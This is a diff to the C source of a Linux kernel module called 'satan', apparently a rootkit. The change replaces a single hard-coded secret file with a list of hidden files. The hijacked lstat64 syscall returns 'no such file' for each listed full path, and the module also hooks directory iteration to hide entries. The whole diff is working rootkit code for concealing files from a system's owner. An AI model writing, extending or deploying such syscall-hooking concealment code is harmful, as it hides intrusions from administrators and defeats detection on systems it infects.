@@ -9,6 +9,21 @@
 #include "syscall.h"
 #include "util.h"
 
+#define BASENAME_BUF_SIZE 128
+#define FILENAME_BUF_SIZE 128
+static char basename_buf[BASENAME_BUF_SIZE] = {0};
+static char filename_buf[BASENAME_BUF_SIZE] = {0};
+static char *basename = NULL;
+
+
+struct hidden_file {
+        char *fullpath;
+        char *basename;
+        char *filename;
+        struct list_head list;
+};
+static LIST_HEAD(hidden_files);
+
 
 static int ret = 0;
 static struct file *filp = NULL;
@@ -28,34 +43,25 @@ asmlinkage int (*real_lstat64)(const char __user *filename,
 asmlinkage long satan_lstat64(const char __user *filename,
                               struct stat64 __user *statbuf)
 {
-        /*
-        char buf[256] = {0};
-        strncpy_from_user(buf, filename, 256);
+        struct hidden_file *f = NULL;
+        struct list_head *p = NULL;
 
-        pr_info("satan: hijacked lstat64(%s, ...)\n", buf);
+        strncpy_from_user(filename_buf, filename, FILENAME_BUF_SIZE);
+       
+        list_for_each(p, &hidden_files) {
+                f = list_entry(p, struct hidden_file, list);
 
-        if (!strncmp(buf, SECRET_FILE, strlen(SECRET_FILE))) {
-                return -ENOENT;
+                if (!strncmp(filename_buf, f->fullpath, strlen(f->fullpath))) {
+                        return -ENOENT;
+                }
         }
-        */
 
         real_lstat64 = (void *) satan_syscall_get_original(__NR_lstat64);
         return real_lstat64(filename, statbuf);
 }
 
 
-#define BASENAME_BUF_SIZE 128
-#define FILENAME_BUF_SIZE 128
-static char basename_buf[BASENAME_BUF_SIZE] = {0};
-static char filename_buf[BASENAME_BUF_SIZE] = {0};
-static char *basename = NULL;
 
-struct hidden_file {
-        char *basename;
-        char *filename;
-        struct list_head list;
-};
-static LIST_HEAD(hidden_files);
 
 static int satan_file_hook_parent_dir_iterate_shared(struct hidden_file *f);
 static int satan_file_unhook_parent_dir_iterate_shared(const struct hidden_file *f);
@@ -70,9 +76,11 @@ static struct hidden_file *hidden_files_add(const char *path)
         satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
         satan_filename(path, filename_buf, FILENAME_BUF_SIZE);
 
+        f->fullpath = kzalloc(strlen(path) + 1, GFP_KERNEL);
         f->basename = kzalloc(strlen(basename_buf) + 1, GFP_KERNEL);
         f->filename = kzalloc(strlen(filename_buf) + 1, GFP_KERNEL);
 
+        strcpy(f->fullpath, path);
         strcpy(f->basename, basename_buf);
         strcpy(f->filename, filename_buf);
 
@@ -99,6 +107,7 @@ static int hidden_files_del(const char *path)
                 if (!strcmp(f->basename, basename_buf) && !strcmp(f->filename, filename_buf)) {
                         pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
                         list_del(p);
+                        kfree(f->fullpath);
                         kfree(f->basename);
                         kfree(f->filename);
                         kfree(f);
